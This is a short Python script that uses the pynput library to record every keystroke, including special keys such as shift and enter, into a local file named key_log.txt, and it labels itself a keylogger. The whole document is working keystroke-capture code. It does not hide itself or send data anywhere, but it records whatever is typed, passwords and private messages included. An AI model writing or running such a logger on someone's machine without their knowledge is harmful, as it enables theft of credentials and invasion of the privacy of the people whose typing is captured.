from pynput import keyboard

log_file = "key_log.txt"

# This function is called every time a key is pressed
def on_press(key):
    try:
        # Write the character directly (for letters, numbers, etc.)
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        with open(log_file, "a") as file:
            file.write(f" [{key.name}] ")

# Start listening to the keyboard
listener = keyboard.Listener(on_press=on_press)
listener.start()

print("🔍 Keylogger is running. Press Ctrl+C to stop.")

# Keep the program running
listener.join()



